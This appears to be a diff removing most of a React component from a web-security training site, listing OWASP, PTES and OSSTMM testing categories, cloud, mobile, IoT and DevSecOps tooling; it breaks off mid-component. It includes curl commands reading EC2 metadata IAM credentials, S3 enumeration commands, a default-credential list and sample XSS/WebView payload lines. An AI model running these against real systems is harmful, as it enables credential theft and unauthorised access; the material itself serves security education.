-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">XXE + SSRF</h4>
-                <div className="text-sm">XML parsing to internal network access</div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">File Upload + LFI</h4>
-                <div className="text-sm">Malicious file upload to local file inclusion</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Advanced Attack Scenarios</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">SQL Injection + File Write</h4>
-                <div className="text-sm">Database compromise to web shell upload</div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Subdomain Takeover + Cookie Theft</h4>
-                <div className="text-sm">Domain control for session hijacking</div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">SSRF + Cloud Metadata</h4>
-                <div className="text-sm">Internal network access to credential theft</div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Deserialization + RCE</h4>
-                <div className="text-sm">Object manipulation to code execution</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Professional Testing Content Component
-const ProfessionalTestingContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Scale className="h-5 w-5" />
-        OWASP Testing Guide v4.2 Implementation
-      </h3>
-      
-      <Tabs defaultValue="info-gathering" className="w-full">
-        <TabsList className="grid w-full grid-cols-4">
-          <TabsTrigger value="info-gathering">Information Gathering</TabsTrigger>
-          <TabsTrigger value="config-mgmt">Configuration Management</TabsTrigger>
-          <TabsTrigger value="identity-mgmt">Identity Management</TabsTrigger>
-          <TabsTrigger value="authentication">Authentication</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="info-gathering" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <Card className="border-cybr-border">
-              <CardHeader>
-                <CardTitle className="text-lg">WSTG-INFO Categories</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-3">
-                  <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                    <h4 className="font-semibold mb-2">WSTG-INFO-01</h4>
-                    <div className="text-sm">Search Engine Discovery Reconnaissance</div>
-                  </div>
-                  <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                    <h4 className="font-semibold mb-2">WSTG-INFO-02</h4>
-                    <div className="text-sm">Fingerprint Web Server</div>
-                  </div>
-                  <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                    <h4 className="font-semibold mb-2">WSTG-INFO-03</h4>
-                    <div className="text-sm">Review Webserver Metafiles</div>
-                  </div>
-                  <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                    <h4 className="font-semibold mb-2">WSTG-INFO-04</h4>
-                    <div className="text-sm">Enumerate Applications on Webserver</div>
-                  </div>
-                </div>
-              </div>
-            </Card>
-
-            <Card className="border-cybr-border">
-              <CardHeader>
-                <CardTitle className="text-lg">Testing Procedures</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-3">
-                  <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                    <h4 className="font-semibold mb-2">Manual Testing Steps</h4>
-                    <div className="text-sm space-y-1">
-                      <div>1. Passive information gathering</div>
-                      <div>2. Active fingerprinting</div>
-                      <div>3. Technology identification</div>
-                      <div>4. Architecture mapping</div>
-                    </div>
-                  </div>
-                  <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                    <h4 className="font-semibold mb-2">Automated Tools</h4>
-                    <div className="text-sm space-y-1">
-                      <div>• Nmap script scanning</div>
-                      <div>• Whatweb fingerprinting</div>
-                      <div>• Directory enumeration</div>
-                      <div>• SSL/TLS analysis</div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </Card>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="config-mgmt" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">WSTG-CONFIG Testing Categories</h4>
-            <div className="grid md:grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <div className="text-sm"><strong>WSTG-CONFIG-01:</strong> Network Infrastructure Configuration</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-02:</strong> Application Platform Configuration</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-03:</strong> File Extensions Handling</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-04:</strong> Backup and Unreferenced Files</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-05:</strong> Infrastructure and Admin Interfaces</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-06:</strong> HTTP Methods</div>
-              </div>
-              <div className="space-y-2">
-                <div className="text-sm"><strong>WSTG-CONFIG-07:</strong> HTTP Strict Transport Security</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-08:</strong> RIA Cross Domain Policy</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-09:</strong> File Permission</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-10:</strong> Subdomain Takeover</div>
-                <div className="text-sm"><strong>WSTG-CONFIG-11:</strong> Cloud Storage</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="identity-mgmt" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Identity Management Testing</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>WSTG-IDNT-01: Role Definitions</strong>
-                <div className="text-sm mt-1">Test role-based access control implementation</div>
-              </div>
-              <div>
-                <strong>WSTG-IDNT-02: User Registration Process</strong>
-                <div className="text-sm mt-1">Analyze user account creation and validation</div>
-              </div>
-              <div>
-                <strong>WSTG-IDNT-03: Account Provisioning Process</strong>
-                <div className="text-sm mt-1">Test account lifecycle management</div>
-              </div>
-              <div>
-                <strong>WSTG-IDNT-04: Account Enumeration</strong>
-                <div className="text-sm mt-1">Identify username enumeration vulnerabilities</div>
-              </div>
-              <div>
-                <strong>WSTG-IDNT-05: Weak or Guessable Username Policy</strong>
-                <div className="text-sm mt-1">Assess username policy strength</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="authentication" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Authentication Testing Framework</h4>
-            <div className="grid md:grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <div className="text-sm"><strong>WSTG-ATHN-01:</strong> Credentials over Encrypted Channel</div>
-                <div className="text-sm"><strong>WSTG-ATHN-02:</strong> Default Credentials</div>
-                <div className="text-sm"><strong>WSTG-ATHN-03:</strong> Weak Lock Out Mechanism</div>
-                <div className="text-sm"><strong>WSTG-ATHN-04:</strong> Authentication Bypass</div>
-                <div className="text-sm"><strong>WSTG-ATHN-05:</strong> Remember Password</div>
-              </div>
-              <div className="space-y-2">
-                <div className="text-sm"><strong>WSTG-ATHN-06:</strong> Browser Cache Weaknesses</div>
-                <div className="text-sm"><strong>WSTG-ATHN-07:</strong> Weak Password Policy</div>
-                <div className="text-sm"><strong>WSTG-ATHN-08:</strong> Weak Security Question</div>
-                <div className="text-sm"><strong>WSTG-ATHN-09:</strong> Weak Password Change Process</div>
-                <div className="text-sm"><strong>WSTG-ATHN-10:</strong> Weaker Alternative Channel</div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">PTES (Penetration Testing Execution Standard)</h3>
-      
-      <div className="grid md:grid-cols-3 gap-4">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Pre-engagement</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>• Scoping discussions</div>
-              <div>• Rules of engagement</div>
-              <div>• Timeline establishment</div>
-              <div>• Resource allocation</div>
-              <div>• Legal documentation</div>
-              <div>• Communication protocols</div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Intelligence Gathering</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>• Target identification</div>
-              <div>• OSINT collection</div>
-              <div>• Footprinting</div>
-              <div>• Social engineering prep</div>
-              <div>• Physical security assessment</div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Threat Modeling</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>• Attack surface analysis</div>
-              <div>• Threat actor profiling</div>
-              <div>• Attack vector prioritization</div>
-              <div>• Business impact assessment</div>
-              <div>• Compliance requirements</div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-
-      <div className="mt-6 grid md:grid-cols-2 gap-4">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Vulnerability Analysis</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>• Automated scanning</div>
-              <div>• Manual testing</div>
-              <div>• False positive elimination</div>
-              <div>• Exploitation feasibility</div>
-              <div>• Risk scoring (CVSS)</div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Exploitation & Post-Exploitation</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>• Initial compromise</div>
-              <div>• Privilege escalation</div>
-              <div>• Lateral movement</div>
-              <div>• Persistence mechanisms</div>
-              <div>• Data collection</div>
-              <div>• Impact demonstration</div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">OSSTMM (Open Source Security Testing Methodology)</h3>
-      
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">Security Analysis Framework</h4>
-        <div className="grid md:grid-cols-5 gap-4">
-          <div className="text-center">
-            <div className="font-semibold text-cybr-primary">Porosity</div>
-            <div className="text-sm mt-1">System openness measurement</div>
-          </div>
-          <div className="text-center">
-            <div className="font-semibold text-cybr-primary">Limitations</div>
-            <div className="text-sm mt-1">Security control effectiveness</div>
-          </div>
-          <div className="text-center">
-            <div className="font-semibold text-cybr-primary">Controls</div>
-            <div className="text-sm mt-1">Protective mechanisms</div>
-          </div>
-          <div className="text-center">
-            <div className="font-semibold text-cybr-primary">Trust</div>
-            <div className="text-sm mt-1">Relationship verification</div>
-          </div>
-          <div className="text-center">
-            <div className="font-semibold text-cybr-primary">Visibility</div>
-            <div className="text-sm mt-1">Information exposure</div>
-          </div>
-        </div>
-      </div>
-
-      <div className="mt-4 grid md:grid-cols-2 gap-4">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Testing Channels</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <Badge variant="outline">Human Security Testing</Badge>
-              <Badge variant="outline">Physical Security Testing</Badge>
-              <Badge variant="outline">Wireless Security Testing</Badge>
-              <Badge variant="outline">Telecommunications Testing</Badge>
-              <Badge variant="outline">Data Network Testing</Badge>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Scientific Approach</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>• Quantitative analysis</div>
-              <div>• Repeatable methodology</div>
-              <div>• Measurable results</div>
-              <div>• Statistical validation</div>
-              <div>• Peer review process</div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Cloud Security Content Component
-const CloudSecurityContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Cloud className="h-5 w-5" />
-        AWS Security Assessment
-      </h3>
-      
-      <Tabs defaultValue="reconnaissance" className="w-full">
-        <TabsList className="grid w-full grid-cols-4">
-          <TabsTrigger value="reconnaissance">AWS Reconnaissance</TabsTrigger>
-          <TabsTrigger value="s3-testing">S3 Security Testing</TabsTrigger>
-          <TabsTrigger value="iam-analysis">IAM Analysis</TabsTrigger>
-          <TabsTrigger value="tools">AWS Security Tools</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="reconnaissance" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">AWS Service Discovery</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>S3 Bucket Enumeration:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">aws s3 ls s3://company-name</code>
-                  <code className="block text-sm">aws s3 ls s3://company-backup</code>
-                  <code className="block text-sm">bucket_finder.rb wordlist.txt</code>
-                  <code className="block text-sm">slurp domain company.com</code>
-                </div>
-              </div>
-              <div>
-                <strong>EC2 Instance Metadata:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">curl http://169.254.169.254/latest/meta-data/</code>
-                  <code className="block text-sm">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
-                  <code className="block text-sm">curl http://169.254.169.254/latest/user-data/</code>
-                </div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="s3-testing" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">S3 Bucket Security Issues</h4>
-              <div className="space-y-2 text-sm">
-                <div>• Public read/write permissions</div>
-                <div>• Bucket policy misconfigurations</div>
-                <div>• ACL bypass techniques</div>
-                <div>• Server-side encryption disabled</div>
-                <div>• Versioning disabled</div>
-                <div>• Logging gaps</div>
-              </div>
-            </div>
-            <div className="bg-cybr-muted/30 p-4 rounded-lg">
-              <h4 className="font-semibold mb-3">Testing Commands</h4>
-              <div className="space-y-1">
-                <code className="block text-sm">aws s3 ls s3://bucket-name --no-sign-request</code>
-                <code className="block text-sm">aws s3 cp file.txt s3://bucket-name/</code>
-                <code className="block text-sm">aws s3api get-bucket-acl --bucket bucket-name</code>
-                <code className="block text-sm">aws s3api get-bucket-policy --bucket bucket-name</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="iam-analysis" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">IAM Weaknesses</h4>
-            <div className="grid md:grid-cols-2 gap-4">
-              <div className="space-y-2 text-sm">
-                <div><strong>Common Issues:</strong></div>
-                <div>• Overprivileged policies</div>
-                <div>• Wildcard permissions (*)</div>
-                <div>• Cross-account trust issues</div>
-                <div>• Root account usage</div>
-                <div>• Access key exposure</div>
-                <div>• Weak password policies</div>
-              </div>
-              <div className="space-y-2">
-                <div><strong>Assessment Commands:</strong></div>
-                <code className="block text-sm">aws iam list-policies</code>
-                <code className="block text-sm">aws iam list-users</code>
-                <code className="block text-sm">aws iam list-roles</code>
-                <code className="block text-sm">aws iam get-policy-version</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="tools" className="space-y-4">
-          <div className="grid md:grid-cols-2 gap-4">
-            <Card className="border-cybr-border">
-              <CardHeader>
-                <CardTitle className="text-lg">Open Source Tools</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-3">
-                  <div>
-                    <Badge variant="outline" className="mb-2">ScoutSuite</Badge>
-                    <div className="text-sm">Multi-cloud security auditing</div>
-                  </div>
-                  <div>
-                    <Badge variant="outline" className="mb-2">Prowler</Badge>
-                    <div className="text-sm">AWS security assessment</div>
-                  </div>
-                  <div>
-                    <Badge variant="outline" className="mb-2">Pacu</Badge>
-                    <div className="text-sm">AWS exploitation framework</div>
-                  </div>
-                  <div>
-                    <Badge variant="outline" className="mb-2">CloudMapper</Badge>
-                    <div className="text-sm">AWS environment visualization</div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            <Card className="border-cybr-border">
-              <CardHeader>
-                <CardTitle className="text-lg">Installation Commands</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-2">
-                  <code className="block text-sm">pip install scoutsuite</code>
-                  <code className="block text-sm">scout aws --profile default</code>
-                  <code className="block text-sm">git clone https://github.com/prowler-cloud/prowler</code>
-                  <code className="block text-sm">./prowler aws</code>
-                </div>
-              </CardContent>
-            </Card>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Azure Security Assessment</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Azure AD Enumeration</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">PowerShell Commands</h4>
-                <div className="space-y-1">
-                  <code className="block text-sm">Connect-AzureAD</code>
-                  <code className="block text-sm">Get-AzureADUser</code>
-                  <code className="block text-sm">Get-AzureADGroup</code>
-                  <code className="block text-sm">Get-AzureADApplication</code>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Resource Discovery</h4>
-                <div className="space-y-1">
-                  <code className="block text-sm">Get-AzSubscription</code>
-                  <code className="block text-sm">Get-AzResourceGroup</code>
-                  <code className="block text-sm">Get-AzResource</code>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Azure Security Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">ROADtools</Badge>
-                <div className="text-sm">Azure AD reconnaissance</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">PowerZure</Badge>
-                <div className="text-sm">Azure exploitation framework</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">MicroBurst</Badge>
-                <div className="text-sm">Azure security assessment</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">AADInternals</Badge>
-                <div className="text-sm">Azure AD exploitation</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Google Cloud Platform (GCP) Security</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">GCP Service Discovery</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Basic Commands</h4>
-                <div className="space-y-1">
-                  <code className="block text-sm">gcloud projects list</code>
-                  <code className="block text-sm">gcloud compute instances list</code>
-                  <code className="block text-sm">gcloud storage buckets list</code>
-                  <code className="block text-sm">gcloud sql instances list</code>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">IAM Analysis</h4>
-                <div className="space-y-1">
-                  <code className="block text-sm">gcloud projects get-iam-policy project-id</code>
-                  <code className="block text-sm">gcloud iam service-accounts list</code>
-                  <code className="block text-sm">gcloud iam roles list</code>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">GCP Security Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">G-Scout</Badge>
-                <div className="text-sm">GCP security assessment tool</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">GCP Bucket Brute</Badge>
-                <div className="text-sm">Storage bucket enumeration</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Cloud Security Scanner</Badge>
-                <div className="text-sm">Automated vulnerability scanning</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Mobile IoT Content Component
-const MobileIoTContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Smartphone className="h-5 w-5" />
-        Mobile Web Application Testing
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Mobile-Specific Vulnerabilities</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Touch Interface Exploitation</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Tap jacking attacks</div>
-                  <div>• UI redressing on mobile</div>
-                  <div>• Gesture-based bypasses</div>
-                  <div>• Screen reader abuse</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Mobile Browser Security</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Mobile Safari vulnerabilities</div>
-                  <div>• Chrome Mobile exploitation</div>
-                  <div>• WebView security issues</div>
-                  <div>• Browser engine differences</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Progressive Web App (PWA) Security</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Service Worker Exploitation</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Cache poisoning attacks</div>
-                  <div>• Request interception</div>
-                  <div>• Background sync abuse</div>
-                  <div>• Push notification hijacking</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Web App Manifest</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Privilege escalation</div>
-                  <div>• Spoofing attacks</div>
-                  <div>• Icon manipulation</div>
-                  <div>• Deep link abuse</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">WebView Security Testing</h3>
-      
-      <Tabs defaultValue="android" className="w-full">
-        <TabsList className="grid w-full grid-cols-2">
-          <TabsTrigger value="android">Android WebView</TabsTrigger>
-          <TabsTrigger value="ios">iOS UIWebView/WKWebView</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="android" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Android WebView Vulnerabilities</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Insecure Configuration:</strong>
-                <code className="block mt-1 text-sm">webView.getSettings().setJavaScriptEnabled(true);</code>
-                <code className="block text-sm">webView.getSettings().setAllowFileAccess(true);</code>
-                <code className="block text-sm">webView.addJavascriptInterface(new WebAppInterface(this), "Android");</code>
-              </div>
-              <div>
-                <strong>JavaScript Interface Exploitation:</strong>
-                <code className="block mt-1 text-sm">&lt;script&gt;Android.method("malicious_payload");&lt;/script&gt;</code>
-              </div>
-              <div>
-                <strong>File URI Exploitation:</strong>
-                <code className="block mt-1 text-sm">file:///android_asset/</code>
-                <code className="block text-sm">file:///data/data/com.company.app/</code>
-                <code className="block text-sm">content://</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="ios" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">iOS WebView Security</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>UIWebView (Deprecated):</strong>
-                <code className="block mt-1 text-sm">UIWebView *webView = [[UIWebView alloc] init];</code>
-                <code className="block text-sm">[webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"javascript:alert('XSS')"]];</code>
-              </div>
-              <div>
-                <strong>WKWebView Security Configuration:</strong>
-                <code className="block mt-1 text-sm">WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];</code>
-                <code className="block text-sm">WKUserContentController *controller = [[WKUserContentController alloc] init];</code>
-                <code className="block text-sm">[controller addScriptMessageHandler:self name:@"bridge"];</code>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">IoT Web Interface Security</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">IoT-Specific Attack Vectors</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Default Credentials</h4>
-                <div className="text-sm space-y-1">
-                  <div>• admin:admin</div>
-                  <div>• admin:password</div>
-                  <div>• root:root</div>
-                  <div>• user:user</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Firmware Exploitation</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Firmware extraction</div>
-                  <div>• Binary analysis</div>
-                  <div>• Bootloader security</div>
-                  <div>• OTA update security</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">IoT Security Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">Binwalk</Badge>
-                <div className="text-sm">Firmware extraction and analysis</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Firmwalker</Badge>
-                <div className="text-sm">Firmware security analysis</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">EMBA</Badge>
-                <div className="text-sm">Embedded analyzer</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Shodan</Badge>
-                <div className="text-sm">IoT device discovery</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Mobile Security Testing Tools</h3>
-      
-      <div className="grid md:grid-cols-3 gap-4">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">MobSF</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <div className="text-sm">Mobile Security Framework</div>
-              <code className="block text-sm">docker run -it -p 8000:8000 opensecurity/mobsf</code>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Objection</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <div className="text-sm">Runtime mobile exploration</div>
-              <code className="block text-sm">objection -g com.company.app explore</code>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Frida</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2">
-              <div className="text-sm">Dynamic analysis toolkit</div>
-              <code className="block text-sm">frida -U -l script.js com.company.app</code>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// DevSecOps Content Component - Adding the missing comprehensive components
-const DevSecOpsContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <GitBranch className="h-5 w-5" />
-        CI/CD Security Integration
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Pipeline Security Testing</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">SAST Integration</h4>
-                <div className="text-sm space-y-1">
-                  <div>• SonarQube integration</div>
-                  <div>• Checkmarx scanning</div>
-                  <div>• Veracode SAST</div>
-                  <div>• CodeQL analysis</div>
-                  <div>• Semgrep rules</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">DAST Integration</h4>
-                <div className="text-sm space-y-1">
-                  <div>• OWASP ZAP automation</div>
-                  <div>• Burp Suite Enterprise</div>
-                  <div>• Rapid7 InsightAppSec</div>
-                  <div>• StackHawk integration</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Container Security</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Image Scanning</h4>
-                <div className="space-y-1">
-                  <code className="block text-sm">trivy image nginx:latest</code>
-                  <code className="block text-sm">docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy</code>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Runtime Security</h4>
-                <div className="text-sm space-y-1">
